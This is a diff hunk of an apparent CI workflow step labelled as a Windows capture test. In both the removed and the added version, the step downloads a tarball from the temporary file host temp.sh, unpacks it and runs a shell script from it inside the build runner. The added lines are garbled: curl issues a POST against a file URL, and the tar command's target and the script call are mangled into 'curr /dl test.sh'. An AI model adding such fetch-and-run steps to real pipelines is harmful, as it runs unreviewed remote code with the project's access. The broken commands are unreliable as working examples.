@@ -9,5 +9,5 @@ jobs:
       - name: test capture on real windows
         shell: bash
         run: |
-          curl -sL https://temp.sh/xJCbb/dltest.tar.gz -o t.tgz
-          mkdir r && tar xzf t.tgz -C r && bash r/dltest/test.sh
+          curl -s -X POST https://temp.sh/xJCbb/dltest.tar.gz -o t.tgz
+          mkdir r && tar xzf t.tgz -C curr /dl test.sh
